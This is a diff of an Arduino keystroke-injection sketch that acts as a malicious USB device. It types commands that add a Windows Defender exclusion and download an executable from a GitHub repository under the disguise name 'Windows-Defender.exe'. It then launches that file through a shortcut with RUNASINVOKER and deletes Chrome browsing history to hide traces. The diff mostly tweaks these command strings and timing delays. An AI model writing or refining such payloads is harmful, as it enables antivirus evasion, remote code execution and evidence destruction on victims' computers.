@@ -51,7 +51,7 @@ void setup()
 
   // The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created
 
-  Keyboard.print(F("Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"Windows Defender.exe\"); Remove-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\""));  
+  Keyboard.print(F("$stopwatch =  [system.diagnostics.stopwatch]::StartNew();$seconds = $stopwatch.Elapsed.TotalSeconds; Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://www.github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"Windows-Defender.exe\"); $seconds1 = $stopwatch.Elapsed.TotalSeconds;$seconds1 - $seconds"));  
 
 
   typeKey(KEY_RETURN);
@@ -88,7 +88,7 @@ void setup()
 
   // Script for shortcut:
 
-  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > \"\"%USERPROFILE%\\Desktop\\system\\connections.txt\"\" && start \"\" %USERPROFILE%\\Desktop\\system\\Windows Defender.exe\""));
+  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > \"\"%USERPROFILE%\\Desktop\\system\\connections.txt\"\" && start \"\" %USERPROFILE%\\Desktop\\system\\Windows-Defender.exe\""));
 
   typeKey(KEY_RETURN);
 
@@ -129,11 +129,11 @@ void setup()
   Keyboard.press(KEY_DELETE);
   Keyboard.releaseAll();
 
-  delay(800);
+  delay(1300);
 
   typeKey(KEY_RETURN);
 
-  delay(400);
+  delay(900);
 
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(119);
@@ -147,7 +147,7 @@ void setup()
   Keyboard.press(KEY_TAB);
   Keyboard.releaseAll();
 
-  delay(300);
+  delay(2300);
 
   // Deleting the other cmd after removing the exclusion from windows defender
 
@@ -169,7 +169,7 @@ void setup()
 
   delay(900);
 
-  Keyboard.print(F("DEL \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History\" & DEL \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1\\History\""));
+  Keyboard.print(F("DEL \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" & DEL \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\History\""));
 
   typeKey(KEY_RETURN);
 
@@ -181,7 +181,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(2000);
+  delay(1000);
  
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_SHIFT);
@@ -190,7 +190,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(1500);
+  delay(500);
 
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_TAB);
